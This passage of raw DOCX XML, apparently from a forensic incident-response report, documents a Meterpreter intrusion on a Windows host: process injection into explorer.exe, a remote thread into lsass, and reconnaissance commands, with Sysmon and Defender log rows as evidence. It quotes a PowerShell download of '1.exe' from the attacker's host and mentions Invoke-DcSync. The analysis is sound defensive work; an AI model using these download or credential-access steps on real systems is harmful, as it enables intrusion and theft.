                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.431470</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webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:4140,ProcessStart:133440851762938641</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 1116 | Microsoft-Windows-Windows Defender | Detection - The antimalware platform detected malware or other potentially unwanted software | Malware name: Trojan:Win64/Meterpreter.E | Description: Trojan (Severe) | Detection Time: 2023-11-10T10:19:36.274Z | Process (if real-time detection): C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23726</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Q2. What process did the malicious executable migrate to?</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r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>explorer.exe. At 11:03:09.989 UTC pscp.exe (PID 2196) started a new explorer.exe process, PID 7324, ProcessGuid {e6e9f951-0ded-654e-9001-000000000500}, with ParentProcessGuid {e6e9f951-0ded-654e-8f01-000000000500} (Sysmon EID 1). One millisecond later it created a remote thread in that process (Sysmon EID 8, StartAddress 0x0000000000B30000), which is the Meterpreter migrate/injection step. This sacrificial explorer.exe is separate from the user's real shell (explorer PID 2432, GUID {e6e9f951-0907-654e-5c00-000000000500}). From then on the injected explorer 7324 hosted the session. At 11:03:56 it also created a remote thread in lsass.exe (Sysmon EID 8, StartAddress 0x0000028F43080000), which points to credential access (e.g. hashdump/kiwi). That part is an interpretation: the payload run inside lsass is not visible.</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11:03:09.989870</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>explorer.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7324, ProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | RuleName: - | MD5=9FBBF189473A313776019D2EAA72A47A,SHA256=CEF64201A97E08834F5C8952907A1719531A7D99B53309CB2E2956F40CFF3486,IMPHASH=D505016A935B17367AA0263582F3F1E2 | ParentProcess: C:\Payloads\p</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18651</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.990398</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 8 | Microsoft-Windows-Sysmon | CreateRemoteThread | StartAddress: 0x0000000000B30000 | RuleName: - | SourceProcessID: 2196, SourceProcessGUID: e6e9f951-0ded-654e-8f01-000000000500 | SourceImage: C:\Payloads\pscp.exe | TargetProcessID: 7324, TargetProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | TargetImage: C</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18652</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:56.300284</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 8 | Microsoft-Windows-Sysmon | CreateRemoteThread | StartAddress: 0x0000028F43080000 | RuleName: - | SourceProcessID: 7324, SourceProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | SourceImage: C:\Windows\explorer.exe | TargetProcessID: 648, TargetProcessGUID: e6e9f951-0900-654e-0c00-000000000500 | TargetImage:</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18654</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx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bl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Q3. Were any situational awareness commands run? If so, what were they?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br/>
              <w:t>evtx:windows powershell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Yes. All of them ran under medmondson's elevated token (LogonId 0x15347) and came from cmd.exe shells whose parent was the injected explorer.exe 7324. Times are UTC on 2023-11-10.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>From cmd.exe PID 6600 {e6e9f951-0e2d-654e-9101-000000000500}:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 11:04:39 `tracert -h`</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 11:05:01 `tracert -m 6 8.8.8.8`</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 11:05:12 `tracert -h 6 8.8.8.8`</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 11:05:41 `quser`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>From cmd.exe PID 5848 {e6e9f951-0f52-654e-ad01-000000000500}:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 11:09:10 `powershell` (PID 736), which ran `wget http://10.0.0.12:8080/1.exe -o 1.exe` at 11:10:55</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 11:11:23 `tasklist`</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 11:12:23 `netstat -ntb`</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 11:13:25 `whoami /user`</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 11:13:35 `net user administrator`, which spawned `net1 user administrator`. Security 4798 records the local Administrator being enumerated.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Every command has a matching Prefetch entry, with run counts and last-run times that agree with Sysmon to the millisecond: TRACERT.EXE (3), QUSER, TASKLIST, NETSTAT, WHOAMI, NET and NET1 (1 each).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The Meterpreter PowerShell extension also loaded inside explorer.exe at 11:06:40 (PowerShell 600 HostName=MSFConsole, HostApplication=explorer.exe), and Invoke-DcSync bootstrap script blocks were logged.</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11:04:13.885211</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\cmd.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 6600, ProcessGUID: e6e9f951-0e2d-654e-9101-000000000500 | RuleName: - | MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18 | ParentProcess: C:\Windows\ex</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18655</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:39.859949</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -h</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2764, ProcessGUID: e6e9f951-0e47-654e-9301-000000000500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evtxecmd/evtxecmd_0.csv#18656</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:01.056649</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -m 6 8.8.8.8</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7720, ProcessGUID: e6e9f951-0e5d-654e-9401-000000000500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evtxecmd/evtxecmd_0.csv#18657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:12.550053</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -h 6 8.8.8.8</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2180, ProcessGUID: e6e9f951-0e68-654e-9501-000000000500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evtxecmd/evtxecmd_0.csv#18658</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:41.182379</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>quser</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7752, ProcessGUID: e6e9f951-0e85-654e-9601-000000000500 | RuleName: - | MD5=3147F9B0C7089DD698778246E835C494,SHA256=6EE15E5B1311D501FBDAA15C9D1197BA2F99745EA5ABB3E724D598EE53D48A6E,IMPHASH=EA8421BD383CD44D7C13D5BBB67DDFA5 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18659</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:11:23.852357</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tasklist</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 8012, ProcessGUID: e6e9f951-0fdb-654e-ba01-000000000500 | RuleName: - | MD5=80036C62EACEEFAC7F7DF133634321F5,SHA256=9F60240830FAF4DE590360561A6E249F5D0C41FF8AFBB9498BBE5C1A80ABD02C,IMPHASH=DCE1F3B1BD09BBAD166CE65677E33EDB | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18682</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:12:23.447885</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>netstat  -ntb</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 6292, ProcessGUID: e6e9f951-1017-654e-c701-000000000500 | RuleName: - | MD5=2445DECE99DEEDBD701DC6DFE10E648E,SHA256=5A780D6630639FFB7FD3D295C182EAA2A7CAD2C70248C5BA8F334BB3803353CA,IMPHASH=F495C58FFEE3A623AD7AAA6BE78756D5 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18688</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:25.703963</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>whoami  /user</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7220, ProcessGUID: e6e9f951-1055-654e-cb01-000000000500 | RuleName: - | MD5=2EEEEC89E705F73FFBCAE014E1828788,SHA256=A8A4C4719113B071BB50D67F6E12C188B92C70EEAFDFCD6F5DA69B6AAA99A7FD,IMPHASH=7FF0758B766F747CE57DFAC70743FB88 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18694</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.772808</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>net  user administrator</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 736, ProcessGUID: e6e9f951-105f-654e-cc01-000000000500 | RuleName: - | MD5=A63DF9A6E9098CC189F2A3EFC37600F6,SHA256=96CDFD7B263947A6A7C0DB54141A6B8D7777DB0A03A17CBF95666D98422F937B,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07 | ParentProcess: C:\Windows\Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18695</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
